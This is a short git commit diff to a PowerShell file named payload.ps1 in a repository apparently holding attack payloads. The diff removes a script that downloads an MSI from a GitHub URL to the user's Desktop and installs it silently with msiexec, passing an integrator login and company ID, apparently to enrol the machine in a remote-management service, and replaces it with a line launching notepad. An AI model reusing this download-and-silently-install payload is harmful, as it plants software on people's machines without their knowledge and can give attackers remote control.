68bb99a5da6629c1d694aa465b073735a49403ba
T1Cr4azy <85311985+T1Cr4azy@users.noreply.github.com>
2023-06-08 06:18:43 -0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,13 +1,1 @@
-$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
-$downloadPath = "$env:USERPROFILE\Desktop\setup.msi"
-
-# Download the MSI file using the 'Invoke-WebRequest' cmdlet
-Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath
-
-# Check if the download completed successfully
-if (Test-Path $downloadPath) {
-    # Run MSI file with arguments for silent installation
-    Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1" -NoNewWindow -Wait
-} else {
-    Write-Host "Falha ao baixar o arquivo MSI."
-}
+notepad.exe
